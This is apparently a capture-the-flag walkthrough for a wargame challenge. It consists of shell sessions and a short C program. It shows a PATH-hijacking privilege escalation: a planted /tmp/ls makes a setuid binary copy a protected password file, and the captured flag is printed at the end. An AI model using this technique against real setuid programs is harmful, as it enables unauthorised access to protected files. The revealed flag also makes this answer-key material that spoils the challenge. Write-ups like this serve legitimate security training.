
``` bash

app-script-ch11@challenge02:~$ ls -la
total 36
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 Dec 10  2021 .
drwxr-xr-x 25 root                    root            4096 Sep  5  2023 ..
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11
-r--r-----  1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c
-rw-r-----  1 root                    root              43 Dec 10  2021 .git
-r--r-----  1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile
-r--------  1 app-script-ch11-cracked app-script-ch11   14 Dec 10  2021 .passwd
-r--------  1 root                    root             775 Dec 10  2021 ._perms
app-script-ch11@challenge02:~$

```

``` bash

app-script-ch11@challenge02:~$ cat .passwd
cat: .passwd: Permission denied
app-script-ch11@challenge02:~$


```



``` c

#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}

```


``` bash

app-script-ch11@challenge02:~$ export PATH=/tmp:$PATH
app-script-ch11@challenge02:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
app-script-ch11@challenge02:~$

```

``` bash

app-script-ch11@challenge02:~$ echo "cat $PWD/.passwd > /tmp/flag.txt" > /tmp/ls
app-script-ch11@challenge02:~$ cat /tmp/ls
cat /challenge/app-script/ch11/.passwd > /tmp/flag.txt
app-script-ch11@challenge02:~$

```

``` bash

app-script-ch11@challenge02:~$ ./ch11
app-script-ch11@challenge02:~$ cat /tmp/flag.txt
!oPe96a/.s8d5
app-script-ch11@challenge02:~$

```


